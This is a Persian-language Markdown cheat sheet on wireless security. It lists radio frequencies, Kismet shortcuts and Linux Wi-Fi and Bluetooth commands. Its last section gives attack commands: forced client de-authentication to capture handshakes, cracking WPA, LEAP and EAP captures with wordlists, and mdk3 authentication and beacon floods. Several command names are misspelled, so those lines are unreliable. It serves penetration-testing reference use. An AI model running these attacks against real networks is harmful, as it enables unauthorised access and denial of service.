---
layout: default
published: true
---

# بی سیم

### نمودار فرکانس ها

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>تکنولوژی</b>
      </th>
      <th style="text-align:left"><b>فرکانس</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">RFID</td>
      <td style="text-align:left">
        <p>120-150 kHz (LF)</p>
        <p>13.56 MHz (HF)</p>
        <p>433 MHz (lJHF)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Keyless Entry</td>
      <td style="text-align:left">
        <p>315 MHz (N. Am)</p>
        <p>433.92 MHz (Europe,Asia)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Cellular (US)</td>
      <td style="text-align:left">
        <p>698-894 MHz</p>
        <p>1710-1755 MHz</p>
        <p>1850-1910 MHz</p>
        <p>2110-2155 MHz</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">GPS</td>
      <td style="text-align:left">1227.60,1575.42 MHz</td>
    </tr>
    <tr>
      <td style="text-align:left">L Band</td>
      <td style="text-align:left">1-2 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.15.4 (ZigBee)</td>
      <td style="text-align:left">
        <p>868 MHz (Europe)</p>
        <p>915 MHz (lJS,Australia)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">802.15.1 (Bluetooth)</td>
      <td style="text-align:left">2.4-2.483.5 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11 b/g</td>
      <td style="text-align:left">2.4 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11a</td>
      <td style="text-align:left">5.0 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11 n</td>
      <td style="text-align:left">2.4/5.0 GHZ</td>
    </tr>
    <tr>
      <td style="text-align:left">C Band</td>
      <td style="text-align:left">4-8 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">Ku Band</td>
      <td style="text-align:left">12-18 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">K Band</td>
      <td style="text-align:left">18-26.5 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">Ka Band</td>
      <td style="text-align:left">26.5-40 GHz</td>
    </tr>
  </tbody>
</table>### Fcc id lookup

```text
https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm
```

### پایگاه داده فرکانس ها

```text
http://www.radioreference.com/apps/db/
```

### منبع Kismet 

| **دستور** | **توضیح** |
| :--- | :--- |
| e | سرور های kismet |
| h | راهنما |
| z | نمایش تمام صفحه |
| n | شماره شبکه فعلی |
| m | حذف صدا |
| i | جزییات شبکه |
| t | تگ و یا حذف تگ شبکه |
| s | مرتبط سازی لیست شبکه |
| g | گروه بندی شبکه های تگ شده |
| l | نمایش سطوح قدرت کارت شبکه بی سیم |
| u | خذف گروه، گروه فعلی |
| d | نمایش تنظیمات قابل نمایش |
| c | نمایش کاربران شبکه فعلی |
| r | نمودار نرخ بسته ها |
| L | قفل نموده کانال در کانال انتخاب شده |
| a | نمایش آمار شبکه |
| H | بازگشت به کانال عادی |
| p | دریافت نوع بسته |
| +/- | Expand/collapse گروه ها |
| f | مرکز شبکه |
| CTRL+L | نمایش دوباره صفحه |
| w | ردیابی هشدار ها |
| Q | خروج از Kismet |
| X | بستن پنجره popup |

### دستورات wifi در لینوکس

| دستور | توضیح |
| :--- | :--- |
| iwconfig | تنظیمات interface ها |
| rfkill list | نمایش مشکل wifi |
| rfkill unblock all | روشن نموده wifi |
| airdump-ng mon0 | نظارت بر کلیه interface ها |

### وصل شده به شبکه نا امن

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
dhclient ath0
```

### اتصال به wep

```text
iwconfig ath0 essid $SSID key
ifconfig ath0 up
dhclient ath0
```

### اتصال به wpa-psk

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-psk.conf
dhclient ath0
```

### اتصال به wpa-enterprise

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa supplicant -B -i ath0 -c wpa-ent.conf
dhclient ath0
```

## بلوتوث در لینوکس

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">hciconfig hci0 up</td>
      <td style="text-align:left">روشن نموده interface بلوتوث</td>
    </tr>
    <tr>
      <td style="text-align:left">hcitool -i hci0 scan --flush --all</td>
      <td style="text-align:left">جست و جو دستگاه های دارای بلوتوث</td>
    </tr>
    <tr>
      <td style="text-align:left">sdptool browse BD_ADDR</td>
      <td style="text-align:left">لیست سرویس های باز</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>hciconfig hci0 name &quot;NAME&quot; class Ox520204</p>
        <p>pi scan</p>
      </td>
      <td style="text-align:left">انتخاب به عنوان discoverable</td>
    </tr>
    <tr>
      <td style="text-align:left">pand -K</td>
      <td style="text-align:left">حذف جلسه pand</td>
    </tr>
  </tbody>
</table>

## تست شبکه های wifi در لینوکس

### آغاز monitor mode interface

```text
airmon-ng stop ath0
airmon-ng start wifi0
iwconfig ath0 channel $CH
```

### حمله Capture client handshake

```text
airdump-ng -c $CH --bssid $AP -w file athO    #Capture traffic
aireplay-ng -0 10 -a $AP -c $CH athO          #Force client de-auth


```

### حمله Brute force handshake

```text
aircrack-ng -w wordlist capture.cap    # WPA-PSK
asleep -r capture.cap -w dict.asleep   # LEAP
eapmd5pass -r capture.cap -w wordlist  # EAP-HDS



```

### حمله Dos

```text
mdk3    int    a -a $AP    #Auth Flood
mdk3    int    b -c $CH    #Beacon Flood
```
